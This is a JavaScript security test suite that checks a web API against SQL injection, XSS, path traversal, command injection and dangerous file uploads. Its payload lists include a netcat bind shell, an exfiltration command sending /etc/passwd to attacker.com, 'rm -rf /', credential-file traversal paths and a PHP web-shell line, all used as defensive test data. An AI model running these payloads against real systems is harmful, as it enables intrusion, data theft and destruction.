/**
 * Input Sanitization Security Tests
 * Comprehensive testing for input validation and sanitization
 * Tests SQL injection, XSS, Path traversal, Command injection, and other attack vectors
 */

const request = require('supertest');
const { JSDOM } = require('jsdom');
const DOMPurify = require('isomorphic-dompurify');
const validator = require('validator');
const config = require('./security-config');

describe('Input Sanitization Security Tests', () => {
  let testServer;
  let validTokens;

  beforeAll(async () => {
    testServer = await createTestServer();
    validTokens = await generateTestTokens();
  });

  afterAll(async () => {
    if (testServer) {
      await testServer.close();
    }
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      '" OR "1"="1',
      "'; DROP TABLE users--",
      "' UNION SELECT * FROM users--",
      "1' UNION SELECT NULL,username,password FROM users--",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "1' AND (SELECT COUNT(*) FROM users) > 0--",
      "'; EXEC xp_cmdshell('dir')--",
      "1'; WAITFOR DELAY '00:00:05'--",
      "' OR (SELECT TOP 1 name FROM sys.tables)='users'--"
    ];

    test('should sanitize SQL injection in user login', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(testServer)
          .post('/api/auth/login')
          .send({
            username: payload,
            password: 'testpassword'
          });

        // Should not return successful login
        expect([400, 401, 422]).toContain(response.status);
        
        // Should not contain SQL error messages
        const responseText = JSON.stringify(response.body).toLowerCase();
        expect(responseText).not.toMatch(/sql|mysql|postgres|sqlite|oracle|syntax error/i);
        expect(responseText).not.toContain('ORA-');
        expect(responseText).not.toContain('MySQL Error');
      }
    });

    test('should prevent SQL injection in search queries', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(testServer)
          .get(`/api/search?q=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${validTokens.user}`);

        expect([200, 400, 422]).toContain(response.status);
        
        if (response.status === 200) {
          // If successful, should return sanitized results
          expect(response.body.results).toBeDefined();
          expect(Array.isArray(response.body.results)).toBe(true);
          // Should not return system tables or admin data
          const resultString = JSON.stringify(response.body);
          expect(resultString).not.toMatch(/information_schema|sys\.|pg_|admin|root/i);
        }
      }
    });

    test('should validate database query parameters', async () => {
      const testCases = [
        { userId: "1'; DELETE FROM users--" },
        { userId: "1 OR 1=1" },
        { userId: "'; UNION SELECT password FROM users--" },
        { limit: "10; DROP TABLE sessions--" },
        { offset: "0 OR 1=1" }
      ];

      for (const testCase of testCases) {
        const response = await request(testServer)
          .get('/api/users')
          .query(testCase)
          .set('Authorization', `Bearer ${validTokens.admin}`);

        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toMatch(/invalid|validation|parameter/i);
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')" />',
      'javascript:alert("XSS")',
      '<svg onload="alert(\'XSS\')" />',
      '"><script>alert(\'XSS\')</script>',
      "'><script>alert('XSS')</script>",
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<input type="text" value="" onfocus="alert(\'XSS\')" />',
      '<div style="background:url(javascript:alert(\'XSS\'))">',
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E'
    ];

    test('should sanitize XSS in user profile updates', async () => {
      for (const payload of xssPayloads) {
        const response = await request(testServer)
          .put('/api/user/profile')
          .set('Authorization', `Bearer ${validTokens.user}`)
          .send({
            displayName: payload,
            bio: payload,
            website: payload
          });

        if (response.status === 200) {
          // Check that dangerous content is sanitized
          const sanitized = DOMPurify.sanitize(payload);
          expect(response.body.displayName).toBe(sanitized);
          expect(response.body.bio).toBe(sanitized);
          
          // Should not contain script tags or javascript: urls
          const profileData = JSON.stringify(response.body);
          expect(profileData).not.toMatch(/<script[^>]*>/i);
          expect(profileData).not.toMatch(/javascript:/i);
          expect(profileData).not.toMatch(/on\w+\s*=/i); // onload, onclick, etc.
        }
      }
    });

    test('should prevent XSS in comment and message systems', async () => {
      for (const payload of xssPayloads) {
        const response = await request(testServer)
          .post('/api/comments')
          .set('Authorization', `Bearer ${validTokens.user}`)
          .send({
            content: payload,
            postId: 'test-post-123'
          });

        if (response.status === 201) {
          expect(response.body.content).not.toMatch(/<script[^>]*>/i);
          expect(response.body.content).not.toMatch(/javascript:/i);
          expect(response.body.content).not.toMatch(/on\w+\s*=/i);
        }
      }
    });

    test('should validate HTML content in rich text editors', async () => {
      const htmlPayloads = [
        '<p>Safe content</p><script>alert("XSS")</script>',
        '<div><img src="x" onerror="alert(\'XSS\')" /><p>Text</p></div>',
        '<h1>Title</h1><iframe src="javascript:alert(\'XSS\')></iframe>',
        '<strong>Bold</strong><svg onload="alert(\'XSS\')" />'
      ];

      for (const payload of htmlPayloads) {
        const sanitized = sanitizeHtmlContent(payload);
        
        // Should preserve safe HTML tags
        expect(sanitized).toMatch(/<[phdivstrongem]/i);
        
        // Should remove dangerous elements
        expect(sanitized).not.toMatch(/<script[^>]*>/i);
        expect(sanitized).not.toMatch(/<iframe[^>]*>/i);
        expect(sanitized).not.toMatch(/<svg[^>]*onload/i);
        expect(sanitized).not.toMatch(/javascript:/i);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '../../../../../root/.ssh/id_rsa',
      '..\\..\\..\\..\\windows\\system32\\cmd.exe'
    ];

    test('should prevent path traversal in file download endpoints', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(testServer)
          .get(`/api/files/download?file=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${validTokens.user}`);

        expect([400, 403, 404]).toContain(response.status);
        
        // Should not return system files
        if (response.headers['content-type']) {
          expect(response.headers['content-type']).not.toMatch(/octet-stream|binary/i);
        }
      }
    });

    test('should sanitize file upload paths', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(testServer)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${validTokens.user}`)
          .field('filename', payload)
          .attach('file', Buffer.from('test content'), 'test.txt');

        if (response.status === 200) {
          expect(response.body.filename).not.toMatch(/\.\.[\/\\]/g);
          expect(response.body.path).not.toMatch(/\/etc\/|\\windows\\|system32/i);
          expect(response.body.path).toMatch(/^[a-zA-Z0-9_\-\/]+\.[a-zA-Z0-9]+$/);
        }
      }
    });

    test('should validate file inclusion operations', async () => {
      const inclusionPayloads = [
        { template: '../../../etc/passwd' },
        { include: '../../../../root/.bashrc' },
        { view: '..\\..\\windows\\system32\\drivers\\etc\\hosts' }
      ];

      for (const payload of inclusionPayloads) {
        const response = await request(testServer)
          .get('/api/templates/render')
          .query(payload)
          .set('Authorization', `Bearer ${validTokens.user}`);

        expect([400, 403, 404]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; cat /etc/passwd',
      '| whoami',
      '&& ls -la',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '; rm -rf /',
      '| nc -l -p 1234 -e /bin/sh',
      '&& curl http://attacker.com/steal?data=$(cat /etc/passwd)',
      '; python -c "import os; os.system(\'id\')"'
    ];

    test('should prevent command injection in system operations', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(testServer)
          .post('/api/system/execute')
          .set('Authorization', `Bearer ${validTokens.admin}`)
          .send({ command: payload });

        expect([400, 403, 422]).toContain(response.status);
        
        if (response.status === 200) {
          // Should not contain system information
          const output = response.body.output || '';
          expect(output).not.toMatch(/root:|uid=|gid=|etc\/passwd/i);
          expect(output).not.toMatch(/total|drwx|home\/|var\/|usr\//i);
        }
      }
    });

    test('should sanitize user input in shell commands', async () => {
      const testInputs = [
        'test; cat /etc/passwd',
        'filename && rm -rf /',
        'data | base64 -d',
        'input`whoami`'
      ];

      for (const input of testInputs) {
        const sanitized = sanitizeShellInput(input);
        
        expect(sanitized).not.toMatch(/[;&|`$()]/g);
        expect(sanitized).toMatch(/^[a-zA-Z0-9._\-\s]*$/);
      }
    });
  });

  describe('Data Type Validation', () => {
    test('should validate email addresses', async () => {
      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'user@',
        'user..double.dot@example.com',
        'user@-example.com',
        '<script>alert("xss")</script>@example.com',
        'user@example..com'
      ];

      for (const email of invalidEmails) {
        const response = await request(testServer)
          .post('/api/auth/register')
          .send({
            email: email,
            password: 'ValidPassword123!',
            username: 'testuser'
          });

        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toMatch(/email|invalid|format/i);
      }
    });

    test('should validate password strength', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'abc',
        '111111',
        'qwerty',
        '',
        'a'.repeat(100), // Too long
        '<script>alert("xss")</script>'
      ];

      for (const password of weakPasswords) {
        const response = await request(testServer)
          .post('/api/auth/register')
          .send({
            email: 'test@example.com',
            password: password,
            username: 'testuser'
          });

        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
      }
    });

    test('should validate numeric input ranges', async () => {
      const invalidNumbers = [
        { age: -1 },
        { age: 200 },
        { age: 'not-a-number' },
        { age: '25; DROP TABLE users--' },
        { limit: -1 },
        { limit: 10000 },
        { offset: 'invalid' }
      ];

      for (const testCase of invalidNumbers) {
        const response = await request(testServer)
          .put('/api/user/profile')
          .set('Authorization', `Bearer ${validTokens.user}`)
          .send(testCase);

        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
      }
    });
  });

  describe('File Upload Security', () => {
    const dangerousFiles = [
      { filename: 'test.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { filename: 'test.jsp', content: '<% Runtime.exec("rm -rf /"); %>', type: 'text/plain' },
      { filename: 'test.exe', content: Buffer.from('MZ'), type: 'application/octet-stream' },
      { filename: 'test..php', content: 'malicious content', type: 'text/plain' },
      { filename: '../../../evil.sh', content: '#!/bin/bash\nrm -rf /', type: 'text/plain' }
    ];

    test('should reject dangerous file types', async () => {
      for (const file of dangerousFiles) {
        const response = await request(testServer)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${validTokens.user}`)
          .attach('file', file.content, file.filename);

        expect([400, 415, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toMatch(/file type|extension|not allowed/i);
      }
    });

    test('should validate file content matches extension', async () => {
      const mismatchedFiles = [
        { filename: 'image.jpg', content: '<?php echo "hello"; ?>', type: 'image/jpeg' },
        { filename: 'document.pdf', content: '<script>alert("xss")</script>', type: 'application/pdf' },
        { filename: 'data.csv', content: 'MZ', type: 'text/csv' } // Executable content
      ];

      for (const file of mismatchedFiles) {
        const response = await request(testServer)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${validTokens.user}`)
          .attach('file', Buffer.from(file.content), file.filename);

        if (response.status === 200) {
          // If upload succeeds, content should be scanned
          expect(response.body).toHaveProperty('scanned', true);
          expect(response.body).toHaveProperty('safe', true);
        } else {
          expect([400, 415, 422]).toContain(response.status);
        }
      }
    });
  });

  // Helper functions
  function sanitizeHtmlContent(html) {
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'u', 'br'],
      ALLOWED_ATTR: ['class', 'id'],
      FORBID_SCRIPT: true,
      FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form'],
      FORBID_ATTR: ['onclick', 'onload', 'onerror', 'onmouseover']
    });
  }

  function sanitizeShellInput(input) {
    return input
      .replace(/[;&|`$()]/g, '') // Remove dangerous characters
      .replace(/\s+/g, ' ')      // Normalize whitespace
      .trim()
      .substring(0, 100);        // Limit length
  }

  async function createTestServer() {
    // Mock test server implementation
    return {
      close: async () => {}
    };
  }

  async function generateTestTokens() {
    const jwt = require('jsonwebtoken');
    return {
      admin: jwt.sign({ userId: 'admin', role: 'admin' }, config.security.auth.jwt.secret),
      user: jwt.sign({ userId: 'user1', role: 'user' }, config.security.auth.jwt.secret),
      guest: jwt.sign({ userId: 'guest1', role: 'guest' }, config.security.auth.jwt.secret)
    };
  }
});
